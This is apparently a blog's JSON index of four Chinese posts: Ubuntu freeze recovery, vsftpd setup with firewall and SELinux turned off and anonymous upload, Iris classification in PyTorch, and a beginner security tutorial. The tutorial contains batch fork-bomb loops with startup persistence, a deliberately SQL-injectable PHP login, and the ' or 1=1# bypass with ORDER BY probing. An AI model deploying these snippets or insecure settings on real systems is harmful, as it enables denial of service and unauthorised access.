{"pages":[{"title":"about","text":"","link":"/about/index.html"}],"posts":[{"title":"Ubuntu死机解决方法汇总","text":"作者：程序员联盟链接：https://www.jianshu.com/p/36fb9eed82a3來源：简书 为什么不建议强制关机 如果长按电源按键强制关机，有可能损坏硬件或者丢失数据，甚至导致磁盘坏道！ 其实, 大部分时候的死机是假死, 不是真死… 有时候鼠标还能动呢。 还有一个原因: 对于平时忠贞不二的电脑, 我们怎么可以用强制关机这么”家暴”的手段呢… 必须要温柔。 可尝试的解决方法1. 进入TTY终端 Ctrl+Alt+F1进入TTY1终端字符界面, 输入用户名和密码以登录 输入top命令, 找到可能造成假死的进程, 用kill命令结束掉进程。然后Ctrl+Alt+F7回到桌面 2. 直接注销用户Ctrl+Alt+F1进入TTY1终端字符界面, 输入用户名和密码以登录。 然后执行以下的任意一个命令注销桌面重新登录。 1sudo pkill Xorg 或者 1sudo restart lightdm 3. 底层方法如果上面两种方法不成功, 那有可能是比较底层的软件出现问题。 可以试试 :** reisub 方法**。 说具体一点, 是一种系统请求, 直接交给内核处理。 键盘上一般都有一个键SysRq, 和PrintScreen(截屏)在一个键位上，这就是系统请求的键。 这个方法可以在死机的情况下安全地重启计算机, 数据不会丢失。 下面解释一下这个方法： 其实 SysRq是一种叫做系统请求的东西, 按住 Alt-Print 的时候就相当于按住了SysRq键，这个时候输入的一切都会直接由 Linux 内核来处理，它可以进行许多低级操作。 这个时候 reisub 中的每一个字母都是一个独立操作，分别表示： r : unRaw 将键盘控制从 X Server 那里抢回来 e : tErminate 给所有进程发送 SIGTERM 信号，让它们自己解决善后 i : kIll 给所有进程发送 SIGKILL 信号，强制他们马上关闭 s : Sync 将所有数据同步至磁盘 u : Unmount 将所有分区挂载为只读模式 b : reBoot 重启 魔法键组合 reisub 究竟该怎么用？如果某一天你的 Linux 死机了，键盘不听使唤了，Ctrl+Alt+F1 已经没有任何反应，该怎么办呢？ 使用“魔法键”：Alt+SysRq + r,e,i,s,u,b（确实很好背，就是单词 busier (英语”更忙”的意思)的倒写）。 好的，平时电脑那么正常，你自然也不会去按这些按钮。等到真的出事的时候，你把记在小纸条上的这些 tips 拿出来，然后在键盘上按，结果发现啥反应也没有，于是只能欲哭无泪了。 问题在于：究竟该怎么按这些按钮才会有效？首先，你的系统要支持这个功能，查看和开启的方法大家应该很熟悉了，网上也有很多说明，而且最幸运的是：Ubuntu 默认已经开启了这个功能。 接下来就是操作：马上你就会发现，同时按下+压根儿行不通！只会蹦出来一个屏幕截图窗口。所以，真正的做法应该是： 伸出你的左手，同时按住+键，别松开 右手先按一下，左手别松开，等1秒 右手按一下 R，左手别松开，等1秒 右手按一下 E，左手别松开。这时包括桌面在内，所有程序都会终止，你会看到一个黑乎乎的屏幕，稍微等一段时间 右手依次按下 I，S，U，B，左手别松开。每按一次都等那么几秒种，你会发现每按一次，屏幕上信息都会有所变化。最后按下B时，屏幕显示reset，这时你的左手可以松开了，等几秒钟，计算机就会安全重启。","link":"/2021/08/02/Ubuntu%E6%AD%BB%E6%9C%BA%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95%E6%B1%87%E6%80%BB/"},{"title":"利用阿里云ECS搭建FTP服务器","text":"目标： 别的用户可以利用ftp协议访问IP，通过登录指定用户实现文件的上传 本地可以通过登录管理员用户，实现文件的上传和下载 之后更新： 监控anonymous用户上传文件的大小，超过，则发邮件告警并阻止传输 anonymous用户监控 开放阿里云端口开放阿里云ECS服务器20,21端口 安装ftp服务器软件安装vsftpd（very secure fast ftp daemon) 1yum install -y vsftpd 查看vsftp依赖源 1rpm -ql vsftpd 1234567/etc/logrotate.d/vsftpd/etc/pam.d/vsftpd/etc/vsftpd/etc/vsftpd/ftpusers/etc/vsftpd/user_list/etc/vsftpd/vsftpd.conf/etc/vsftpd/vsftpd_conf_migrate.sh /etc/vsftpd/vsftpd.conf 是核心配置文件。 /etc/vsftpd/ftpusers 是黑名单文件，此文件里的用户不允许访问 FTP 服务器。 /etc/vsftpd/user_list 是白名单文件，是允许访问 FTP 服务器的用户列表。 启动vsftpd服务 123systemctl start vsftpd.servicesystemctl status vsftpd.servicesystemctl enable vsftpd.service 查看端口 1netstat -antup | grep ftp 查看防火墙，需关闭 1systemctl status firewalld.service 查看selinux，需关闭 12getenforce getenforce 0 此时打开Windows DOS窗口输入 1ftp ip地址 显示 1234连接到 IP地址220 (vsFTPd 3.0.2)200 Always in UTF8 mode.用户(ip地址:(none)): 此时可以用匿名用户 anonymous登录，不需要密码 123456789331 Please specify the password.密码：230 Login successful.ftp&gt; ls200 PORT command successful. Consider using PASV.150 Here comes the directory listingpubftp&gt; put test.txtftp&gt; get test.txt 如果在cmd中可以打开，但是在Windows地址栏本地被拒绝访问，则可能是系统设置问题 控制面板——程序——打开或关闭Windows功能——(FTP服务器——勾选‘FTP服务’和‘FTP扩展性’)——勾选TFTP客户端 更改Internet属性：打开‘Internet选项’——高级——取消勾选‘使用被动FTP(用于防火墙和DSL调制解调器的兼容)”并点击确定 检查IE浏览器是否处于“脱机”状态，打开“Internet选项”，选择“连接”选项卡，打开“设置”——勾选“自动检测设置”并点击确定 点击打开“局域网设置”——勾选其中的“自动检测设置”，并点击确定 控制面板中进入系统和安全——Windows防火墙——允许程序通过Windows防火墙——确认“Windows 资源管理器”右侧的两个勾选——如果没有勾选则点击上方的“更改设置” 给pub文件增加读权限 cp /etc/vsftpd/vsftpd.conf{,.bak}grep -Ev ‘#’ vsftpd.conf touch data +%F.txt grep 1chmod o+w pub 匿名用户访问(默认开启)/etc/vsftpd/vsftpd.conf 12345anonymous_enable=YES anon_upload_enable=YES # 是否允许上传 anon_umask=022 # 传用户umask值 anon_mkdir_write_enable=yes # 创建目录anon_other_write_enable=yes # 重命名其他文件 1no_anon_password=YES(NO) 当设置为YES时，表示anonymous将会略过密码检验步骤，而直接进入vsftpd服务器内。所以一般默认都是NO（登录时会检查输入的email） 加入了这个配置之后，就能够直接登录FTP查看文件，不会出现需要输入用户名和密码那一个框了。 12more /etc/passwd |grep ftpchmod 755 /var/ftp # 不能是777 vsftp匿名用户无法上传文件 anon_root=/var/ftp/pub 在/var/ftp中建立一个upload文件夹，将个文件夹权限设置为777，在upload这个文件夹中，匿名用户可以上传文件、创建文件夹、删除文件等 本地用户访问使用本地用户登陆成功时位置在家目录的位置 123456789101112131415161718192021[root@localhost ~]# vi /etc/vsftpd/vsftpd.confanonymous_enable=NOlocal_enable=YESwrite_enable=YESlocal_umask=022dirmessage_enable=YESxferlog_enable=YESconnect_from_port_20=YESxferlog_std_format=YESlisten=NOlisten_ipv6=YESpam_service_name=vsftpduserlist_enable=YEStcp_wrappers=YES[root@localhost ~]# systemctl restart vsftpd[root@localhost ~]# systemctl enable vsftpd注意：出现在/etc/vsftpd/ftpuser 中的内容将会被定义为黑名单/etc/vsftpd/user_listuserlist_deny=NO 白名单userlist_deny=YES 黑名单 默认 虚拟用户访问 创建用于进行FTP认证的用户数据库文件，其中奇数行为账户名，偶数行为密码。 1234567[root@localhost ~]# cd /etc/vsftpd/[root@localhost vsftpd]# vi vuser.list自定义ciscocentoshuaweicentos 使用db_load命令用哈希（hash）算法将原始的明文信息文件转换成数据库文件 降低数据库文件的权限（避免其他人看到数据库文件的内容） 把原始的明文信息文件删除。 12345[root@localhost vsftpd]# db_load -T -t hash -f vuser.list vuser.db[root@localhost vsftpd]# file vuser.dbvuser.db: Berkeley DB (Hash, version 9, native byte-order)[root@localhost vsftpd]# chmod 600 vuser.db[root@localhost vsftpd]# rm -f vuser.list 创建一个本地用户，用来做虚拟用户在本地的代理，为了安全起见，禁止这个本 地用户登录 1234[root@localhost vsftpd]# useradd -d /var/ftproot -s /sbin/nologin virtualuser[root@localhost vsftpd]# ls -ld /var/ftproot/drwx------. 2 virtual virtual 59 8月 10 23:04 /var/ftproot/[root@localhost vsftpd]# chmod -Rf 777 /var/ftproot/ 新建一个用于虚拟用户认证的PAM文件vsftpd.vu 123[root@localhost vsftpd]# vim /etc/pam.d/vsftpd.vuauth required pam_userdb.so db=/etc/vsftpd/vuseraccount required pam_userdb.so db=/etc/vsftpd/vuser 配置文件 123456789101112131415161718[root@localhost vsftpd]# cat /etc/vsftpd/vsftpd.confanonymous_enable=NOlocal_enable=YESguest_enable=YESguest_username=virtualallow_writeable_chroot=YESwrite_enable=YESlocal_umask=022dirmessage_enable=YESxferlog_enable=YESconnect_from_port_20=YESxferlog_std_format=YESlisten=NOlisten_ipv6=YESpam_service_name=vsftpd.vu # zhuyi userlist_enable=YEStcp_wrappers=YES[root@localhost vsftpd]# 如果想要针对不同的用户设置不同的权限 123456789101112131415161718192021222324252627[root@localhost vsftpd]# mkdir /etc/vsftpd/vusers_dir/[root@localhost vsftpd]# cd /etc/vsftpd/vusers_dir/[root@localhost vusers_dir]# touch huawei[root@localhost vusers_dir]# vi eagleanon_upload_enable=YESanon_mkdir_write_enable=YESanon_other_write_enable=YES[root@localhost vusers_dir]#[root@localhost vusers_dir]# vi /etc/vsftpd/vsftpd.confanonymous_enable=NOlocal_enable=YESguest_enable=YESguest_username=virtualallow_writeable_chroot=YESwrite_enable=YESlocal_umask=022dirmessage_enable=YESxferlog_enable=YESconnect_from_port_20=YESxferlog_std_format=YESlisten=NOlisten_ipv6=YESpam_service_name=vsftpd.vuuserlist_enable=YEStcp_wrappers=YESuser_config_dir=/etc/vsftpd/vusers_dir[root@localhost vusers_dir]# systemctl restart vsftpd","link":"/2021/09/30/%E5%88%A9%E7%94%A8%E9%98%BF%E9%87%8C%E4%BA%91ECS%E6%90%AD%E5%BB%BAFTP%E6%9C%8D%E5%8A%A1%E5%99%A8/"},{"title":"基于前馈神经网络对iris数据集分类","text":"分类问题（3类，数据网站有数据的详细描述） 数据源http://archive.ics.uci.edu/ml/datasets/Iris 用BP算法训练单隐层前馈神经网络，实现Iris数据分类 数据划分：训练和测试数据集划分参考网站上论文的划分 sklearn.datasets中含有iris的数据集 加载iris数据集并显示数据集格式 123from sklearn.datasets import load_irisiris = load_iris()print(iris) 数据集格式：观察结构为字典，存储在iris中 {‘data’: array([[5.1, 3.5, 1.4, 0.2], ​ [4.9, 3. , 1.4, 0.2], ​ [4.7, 3.2, 1.3, 0.2], ​ [4.6, 3.1, 1.5, 0.2], …… ​ [5.9, 3. , 5.1, 1.8]]), ‘target’: array([0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, ​ 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, ​ 0, 0, 0, 0, 0, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, ​ 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, ​ 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, ​ 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, ​ 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2]), ‘frame’: None, ‘target_names’: array([‘setosa’, ‘versicolor’, ‘virginica’], dtype=’&lt;U10’),’DESCR’:……’filename’: ‘C:\\Users\\zky666\\.conda\\envs\\pytorch\\lib\\site-packages\\sklearn\\datasets\\data\\iris.csv’} 调用pandas库，读取iris中data数据，存储在pandas中DataFrame数据结构中，列标签分别为：Sepal_Length,Sepal_Width,Petal_length,Petal_Width 1iris_d = pd.DataFrame(iris['data'], columns=['Sepal_Length', 'Sepal_Width', 'Petal_Length', 'Petal_Width']) DataFrame的数据格式为： ​ Sepal_Length Sepal_Width Petal_Length Petal_Width 0 5.1 3.5 1.4 0.2 1 4.9 3.0 1.4 0.2 2 4.7 3.2 1.3 0.2 3 4.6 3.1 1.5 0.2 4 5.0 3.6 1.4 0.2 .. … … … … 145 6.7 3.0 5.2 2.3 146 6.3 2.5 5.0 1.9 147 6.5 3.0 5.2 2.0 148 6.2 3.4 5.4 2.3 149 5.9 3.0 5.1 1.8 按照种类，将每个品种的花单独划分为一个分类 12345iris_d['Species'] = iris.targetiris_class1 = iris_d[iris_d[&quot;Species&quot;]==0]iris_class2 = iris_d[iris_d[&quot;Species&quot;]==1]iris_class3 = iris_d[iris_d[&quot;Species&quot;]==2] Sepal_Length Sepal_Width Petal_Length Petal_Width Species 0 5.1 3.5 1.4 0.2 0 1 4.9 3.0 1.4 0.2 0 2 4.7 3.2 1.3 0.2 0 .. … … … … … 148 6.2 3.4 5.4 2.3 2 149 5.9 3.0 5.1 1.8 2 [150 rows x 5 columns] Sepal_Length Sepal_Width Petal_Length Petal_Width Species 0 5.1 3.5 1.4 0.2 0 1 4.9 3.0 1.4 0.2 0 …… 48 5.3 3.7 1.5 0.2 0 49 5.0 3.3 1.4 0.2 0 分析参数两两之间的关系 1234567891011import itertoolsplt.figure(figsize=(15, 10))t = 1for i, j in list(itertools.combinations(['Sepal_Length', 'Sepal_Width', 'Petal_Length', 'Petal_Width'], 2)): plt.subplot(2, 3, t) plt.scatter(iris_class1[i], iris_class1[j], 15 , c = 'r') plt.scatter(iris_class2[i], iris_class2[j], 15 , c = 'g') plt.scatter(iris_class3[i], iris_class3[j], 15 , c = 'b') t += 1 plt.title(str(i) + ' + ' + str(j))plt.show() 结果： 结论： 只有Sepal_Length和Sepal_Width不能很好的分类，其他几项还算是不错 分析三个参数之间的关系 12345678910111213141516171819202122232425262728import itertoolsfrom mpl_toolkits.mplot3d import Axes3Dfig = plt.figure(figsize=(7, 5))ax = Axes3D(fig)ax.scatter(iris_class1['Sepal_Length'], iris_class1['Sepal_Width'], iris_class1['Petal_Length'], c = 'r')ax.scatter(iris_class2['Sepal_Length'], iris_class2['Sepal_Width'], iris_class1['Petal_Length'], c = 'g')ax.scatter(iris_class3['Sepal_Length'], iris_class3['Sepal_Width'], iris_class1['Petal_Length'], c = 'b')fig = plt.figure(figsize=(7, 5))ax = Axes3D(fig)ax.scatter(iris_class1['Sepal_Length'], iris_class1['Sepal_Width'], iris_class1['Petal_Width'], c = 'r')ax.scatter(iris_class2['Sepal_Length'], iris_class2['Sepal_Width'], iris_class1['Petal_Width'], c = 'g')ax.scatter(iris_class3['Sepal_Length'], iris_class3['Sepal_Width'], iris_class1['Petal_Width'], c = 'b')fig = plt.figure(figsize=(7, 5))ax = Axes3D(fig)ax.scatter(iris_class1['Sepal_Length'], iris_class1['Petal_Length'], iris_class1['Petal_Width'], c = 'r')ax.scatter(iris_class2['Sepal_Length'], iris_class2['Petal_Length'], iris_class1['Petal_Width'], c = 'g')ax.scatter(iris_class3['Sepal_Length'], iris_class3['Petal_Length'], iris_class1['Petal_Width'], c = 'b')fig = plt.figure(figsize=(7, 5))ax = Axes3D(fig)ax.scatter(iris_class1['Sepal_Width'], iris_class1['Petal_Length'], iris_class1['Petal_Width'], c = 'r')ax.scatter(iris_class2['Sepal_Width'], iris_class2['Petal_Length'], iris_class1['Petal_Width'], c = 'g')ax.scatter(iris_class3['Sepal_Width'], iris_class3['Petal_Length'], iris_class1['Petal_Width'], c = 'b')plt.show() Sepal_Length + Sepal_Width + Petal_Length： Sepal_Length + Sepal_Width + Petal_Width： Sepal_Length + Petal_Length + Petal_Width： Sepal_Width + Petal_Length + Petal_Width： 结论：其中Sepal_Length + Petal_Length + Petal_Width和Sepal_Width + Petal_Length + Petal_Width分类效果较好 综上所述Petal_Length + Petal_Width在分类中相对有较大影响，因此在后续的数据处理中可能会对原始数据进行降维处理 利用PCA进行降维 调用skleaen.decomposition中PCA函数进行降维 123transfer_1 = PCA(n_components=2)iris_d = transfer_1.fit_transform(iris_d)print(iris_d) 划分训练集与测试集 随机打乱数据（因为原始数据是顺序的，顺序不打乱会影响准确率），并将前120行作为训练集，后30行作为测试集 12345678910111213141516iris_x_numpy = np.array(iris_d)# print(iris_d)np.random.seed(120)np.random.shuffle(iris_x_numpy)x_train = iris_x_numpy[:-30]x_test = iris_x_numpy[-30:]x_train_tensor = torch.tensor(x_train)x_test_tensor = torch.tensor(x_test)# print(iris_x_tensor)iris_numpy_y = np.array(iris.target)np.random.seed(120)np.random.shuffle(iris_numpy_y)y_train = iris_numpy_y[:-30]y_test = iris_numpy_y[-30:]y_train_tensor = torch.tensor(y_train)y_test_tensor = torch.tensor(y_test) 将pandas.DataFrame 转成 torch.tensor 1234x_train_tensor = torch.tensor(x_train)x_test_tensor = torch.tensor(x_test)y_train_tensor = torch.tensor(y_train)y_test_tensor = torch.tensor(y_test) 将Tensor转换为Variable，装载梯度信息 12345x_train_V = Variable(x_train_tensor)x_test_V = Variable(x_test_tensor)y_train_V = Variable(y_train_tensor)y_test_V = Variable(y_test_tensor)print(&quot;y_test_V&quot;, y_test_V) 利用pytorch框架构建BP神经网络模型 12345net = torch.nn.Sequential( torch.nn.Linear(2, 10), torch.nn.ReLU(), torch.nn.Linear(10, 3),) 选择损失值求解算法 1loss_func = torch.nn.CrossEntropyLoss() # the target label is NOT an one-hotted 构造优化器optimizer 123# optimizer = torch.optim.SGD(net.parameters(), lr=0.5) # 随机梯度下降optimizer = torch.optim.ASGD(net.parameters(), lr=0.5, lambd=0.0001, alpha=0.75, t0=1000000.0, weight_decay=0) # 随机梯度下降 训练模型 1234567891011lost_step = []accyracy_list = []for t in range(100): out = net(x_train_V.float()) # input x and predict based on x loss = loss_func(out, y_train_V.long()) # must be (1. nn output, 2. target), the target label is NOT one-hotted print(&quot;loss:&quot;, loss.detach().numpy()) lost_step.append(loss) optimizer.zero_grad() # clear gradients for next train loss.backward() # backpropagation, compute gradients optimizer.step() # apply gradients 检验模型，计算准确率+画图 12345678910111213141516171819202122232425262728293031323334if t % 10 == 0: # plot and show learning process plt.cla() prediction = torch.max(out, 1)[1] print(prediction) pred_y = prediction.data.numpy() print(pred_y) target_y = y_train_V.data.numpy() # print(x) print(x_train_V.data.numpy()[:, 0]) x1_min, x1_max = x_train_V[:, 0].min(), x_train_V[:, 0].max() x2_min, x2_max = x_train_V[:, 1].min(), x_train_V[:, 1].max() plt.scatter(x_train_V.data.numpy()[:, 0], x_train_V.data.numpy()[:, 1], c=pred_y, s=100, lw=0, cmap='RdYlGn') # plt.legend() plt.xlim(x1_min, x1_max) plt.ylim(x2_min, x2_max) y_test_pred = net(x_test_V.float()) prediction_y = torch.max(y_test_pred, 1)[1] pred_y_test = prediction_y.data.numpy() print(&quot;pred_y_test:&quot;, pred_y_test) y_test_target = y_test_V.data.numpy() print(&quot;y_test_target:&quot;, y_test_target) accuracy = float((pred_y_test == y_test_target).astype(int).sum()) / float(y_test_target.size) accyracy_list.append(accuracy) print(accuracy) plt.text(2.3, -1.5, 'Accuracy=%.2f' % accuracy, fontdict={'size': 15, 'color': 'red'}) plt.pause(0.1) 当lr = 0.2时 训练10次： 训练20次： 训练30次： 训练40次： 训练90次： 训练100次： 损失值与测试集准确率变化曲线 当lr = 0.5时 第10次训练： 第20次训练： 第30次训练： 第50次训练： 第100次训练： 损失值与测试集准确率变化曲线 动态更新学习率： 1optimizer = torch.optim.ASGD(net.parameters(), lr=0.5, lambd=0.0001, alpha=0.75, t0=1000000.0, weight_decay=0) 第10次训练： 第20次训练： 第30次训练： 第100次训练： 损失值与测试集准确率变化曲线：","link":"/2021/07/31/%E5%9F%BA%E4%BA%8E%E5%89%8D%E9%A6%88%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E5%AF%B9iris%E6%95%B0%E6%8D%AE%E9%9B%86%E5%88%86%E7%B1%BB/"},{"title":"网络安全必会","text":"信息安全介绍信息安全三要素（CIA）： 保密性 完整性 可用性 信息安全的主要方向 业务可靠性 技术服务 安全渗透 安全服务 护网行动 攻击方 防守方 死循环代码 .bat 可以关机版本 1234%0|%0%0执行自身，有32层递归深度| 管道符，前面代码执行失败执行后面代码 关机不了版本 123456789:Astartstartstartstartstartgoto A 有破坏性版本 123C:\\Users\\administrator\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup开启自启动设置 安全模式：开机时疯狂按F8 Linux命令: pwd ls cd mkdir rm -rf cp -rf mv touch cat vim chmod -R firewall-cmd –add-service=http firewall-cmd –add-port=80/tcp firewall-cmd –list-all yum tree -C systemctl start unzip 漏洞的发现web Web（World Wide Web）即全球广域网，也称为万维网。 我们常说的 Web端 就是网页端。 网页 网页是构成网站的基本元素。网页主要由文字、图像和超链接等元素构成。当然，除了这些元素，网页中还可 以包含音频、视频以及Flash等。 我们在浏览器上输入网址后，打开的任何一个页面，都是属于网页。 浏览器 浏览器是网页运行的平台，常见的浏览器有谷歌（Chrome）、Safari、火狐（Firefox）、IE、Edge、Opera 等。 HTML相当于身体结构 CSS相当于人的衣服和打扮 JavaScript相当于人的行为 标签： div：规范格式，决定界面样式 form：可以包含很多 action=# 谁都不提交 登录页面编写网页框架使用html快速写出一个需要输入用户名和密码的登录框，网页文件名就叫 index.html 123456789101112131415161718192021222324252627282930&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt; &lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;Document&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;div class=&quot;main&quot;&gt; &lt;form action=&quot;#&quot; method=&quot;POST&quot;&gt; &lt;ul&gt; &lt;li&gt;&lt;span class=&quot;photo&quot;&gt;&lt;/span&gt;&lt;/li&gt; &lt;li&gt; &lt;input type=&quot;text&quot; id='username' required&gt; &lt;label for=&quot;username&quot;&gt;用户名&lt;/label&gt; &lt;/li&gt; &lt;li&gt; &lt;input type=&quot;password&quot; id='password' required&gt; &lt;label for=&quot;password&quot;&gt;密码&lt;/label&gt; &lt;/li&gt; &lt;li&gt; &lt;input type=&quot;submit&quot; value=&quot;登录&quot;&gt; &lt;/li&gt; &lt;/ul&gt; &lt;/form&gt; &lt;/div&gt; &lt;/body&gt;&lt;/html&gt; 此时这个页面打开之后是很丑的 为登录框添加样式样式文件名就叫 style.css 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495* {margin: 0;padding: 0;}body {background: #333;}.main {width: 400px;height: 600px;position: absolute;left: 50%;top: 50%;transform: translate(-50%,-50%);border: 1px solid gray;border-radius: 25px;display: flex;justify-content: center;align-items: center;}ul {width: 100%;list-style-type: none;}li {width: 100%;margin-bottom: 25px;position: relative;display: flex;justify-content: center;}li span.photo {background: url(&quot;logo.jpg&quot;);background-size: cover;border-radius: 50%;border: 1px solid white;width: 300px;height: 300px;}li input {width: 80%;display: block;box-sizing: border-box;height: 30px;left: 0;top: 0;background: transparent;border: none;outline: none;color: white;font-size: 25px;}li label {width: 80%;display: block;position: absolute;bottom: 0;color: gray;padding-left: 15px;pointer-events: none;border-bottom: 1px solid white;padding-bottom: 10px;transition: 0.5s linear;}li a {color: white;font-size: 20px;text-decoration: none;text-transform: uppercase;padding: 10px;border-bottom: 1px solid white;transition: 0.2s linear;}li a:hover {/* color:#1e99ff; */border-color: #1e99ff;text-shadow: 0 0 3px #1e99ff, 0 0 6px #1e99ff, 0 0 12px #1e99ff;}li input:focus~label,li input:valid~label {border-color: #1e99ff;color: #1e99ff;padding-bottom: 30px;font-size: 10px;} 在html的 head 标签中引用我们写好的样式 1&lt;link rel=&quot;stylesheet&quot; href=&quot;style.css&quot;&gt; 在源码所在的文件夹添加头像文件 logo.jpg 然后就可以看到网页被美化了 写后端程序实现登录功能首先要确保前端提交的数据能够传给后端应用程序，所以我们需要对参数进行命名，给用户名命名为 username 给密码命名为 password 1234567891011# form标签中添加后端程序的访问路径&lt;form action=&quot;login.php&quot; method=&quot;post&quot;&gt;# index.html文件中改成如下，在input标签中加上name&lt;li&gt;&lt;input type=&quot;text&quot; id='username' name='username' required&gt;&lt;label for=&quot;username&quot;&gt;用户名&lt;/label&gt;&lt;/li&gt;&lt;li&gt;&lt;input type=&quot;password&quot; id='password' name='password' required&gt;&lt;label for=&quot;password&quot;&gt;密码&lt;/label&gt;&lt;/li&gt; 创建数据库，用于保存登录的用户名和密码 1234567891011121314151617181920212223# 创建数据库名为abcmysql&gt; create database abc;Query OK, 1 row affected (0.00 sec)# 进入数据库abcmysql&gt; use abcDatabase changed# 创建admin表，并且指定两列username和passwordmysql&gt; insert into admin values('user01','123456'),('user02','654321');Query OK, 2 rows affected (0.00 sec)Records: 2 Duplicates: 0 Warnings: 0# 插入两个用户的数据mysql&gt; insert into admin values('user01','123456'),('user02','654321');Query OK, 2 rows affected (0.00 sec)Records: 2 Duplicates: 0 Warnings: 0# 查看刚刚插入的数据mysql&gt; select * from admin;+----------+----------+| username | password |+----------+----------+| user01 | 123456 || user02 | 654321 |+----------+----------+2 rows in set (0.00 sec) 编写后端程序代码，后端程序文件名为 login.php 123456789101112131415161718192021222324252627282930313233343536373839&lt;?php $host='localhost'; $database='abc'; $user='root'; $pass='usbw'; $conn=mysql_connect($host,$user,$pass) or die('数据库连接出错！'); $select_db=mysql_select_db($database,$conn); if(!$select_db){ echo &quot;无相关数据库！&quot;; } $flag='未登录！'; $sql=''; if(isset($_POST[&quot;username&quot;]) &amp;&amp; isset($_POST[&quot;password&quot;])){ $username = trim($_POST[&quot;username&quot;]); $password = trim($_POST[&quot;password&quot;]); $sql = &quot;select * from admin where username='&quot;.$username.&quot;' andpassword='&quot;.$password.&quot;'&quot;; $result = mysql_query($sql); if(!mysql_num_rows($result)==0){ $flag=&quot;登录成功！&quot;; }else{ $flag=&quot;登录失败&quot;; } }?&gt;&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;h1&gt;&lt;?php echo $flag; ?&gt;&lt;/h1&gt; &lt;p&gt;&lt;?php echo $sql;?&gt;&lt;/p&gt; &lt;p&gt;&lt;?php echo mysql_error();?&gt;&lt;/p&gt;&lt;/body&gt;&lt;/html&gt; 测试登录成功界面 登录失败页面 直接访问页面 安全问题密码安全如果黑客将服务器破解，就可以在服务器数据库里面直接看到用户的明文密码 我们登录的所有信息都是明文在互联网上传输，如果有黑客在网络上对数据进行监听，那很有可能黑客就直接 能得到我们的密码 比如我们尝试着抓取登录时候的数据包，我们可以清楚的看到用户名和密码相关信息 我们可以使用md5散列函数对密码进行保护，这样我们就不需要将密码发往服务器，只需要往服务器发送密码 的数据指纹即可，这么做并不会阻止黑客登录当前网站，但是却可以防止黑客拿到你的真实密码，从而威胁到你的别的网站的账号安全。 修改html，在其中加入支持md5的javascript代码，并且在输入完密码之后，就将明文密码改为md5散列值 12345678// 以下代码是加在index.html的body结尾&lt;script src=&quot;https://cdn.bootcss.com/jquery/3.2.1/jquery.min.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;https://cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.js&quot;&gt;&lt;/script&gt;&lt;script&gt;$(&quot;#password&quot;).blur((function() {$(&quot;#password&quot;).val(md5($(&quot;#password&quot;).val()));}))&lt;/script&gt; 下面去修改数据库，将原本的密码改为md5的散列值 12345678910111213141516171819# 首先要修改password的长度，上面定义的时候只给了20位的长度mysql&gt; alter table admin modify password varchar(32);Query OK, 2 rows affected (0.03 sec)Records: 2 Duplicates: 0 Warnings: 0# 然后更改数据mysql&gt; update admin set password=md5('123456') where username='user01';Query OK, 1 row affected, 1 warning (0.00 sec)Rows matched: 1 Changed: 1 Warnings: 1mysql&gt; update admin set password=md5('654321') where username='user02';Query OK, 1 row affected, 1 warning (0.00 sec)Rows matched: 1 Changed: 1 Warnings: 1mysql&gt; select * from admin;+----------+----------------------------------+| username | password |+----------+----------------------------------+| user01 | e10adc3949ba59abbe56e057f20f883e || user02 | c33367701511b4f6020ec61ded352059 |+----------+----------------------------------+2 rows in set (0.00 sec) 再次尝试登录用户，可以看到密码已经变成散列值了，黑客没法通过数据库或者数据抓包得到原始的密码 程序的安全判断是否登录成功的逻辑是这样的，执行如下语句 12select * from admin where username='user01' andpassword='e10adc3949ba59abbe56e057f20f883e' 如果在数据库中能够有匹配的查询结构，就判定为登录成功，这样的判断逻辑是没错的。 但是当我们尝试输入如下用户名和密码的时候，一样能登录成功。 用户名：' or 1=1# 密码随便输入 其中 # 号是sql语句的注释，等于这句sql语句变成了 1select * from admin where username='' or 1=1 而 username='' 是一定不成立的，但是1=1是一定成立的，所以where的条件总是为真，导致这个语句一定 能查出所有的数据 这样无论如何都能登录成功，所以 ' or 1=1# 也被称为万能密码，因为在任何没有防护的系统上都能登录成 功。 而这种利用漏洞执行用户自定义SQL语句的入侵方式，被称为SQL注入 SQL注入常用命令 mysql -uroot -p show databases; create database student; use student; create table result(id int(8),name varchar(20),city varchar(20),score int(5)); insert into result(id,name,city,score) values(1,”wang”,”beijing”,75); select * from result; select name,score from result; select score from result where name=”li”; select * from result order by score desc; delete from result where id=7; update result set score=60 where id=5; ==select id,name,score from result order by 1;== 1select c1,c2,...,cn from result order by M; order by后面的数字（M）必须小于或等于n（数据库查询的字段数），才能正常显示。如果M&gt;n，数据库就会 报错。可以利用这个特点判断数据库查询的字段数。 select * from result limit 0,2; 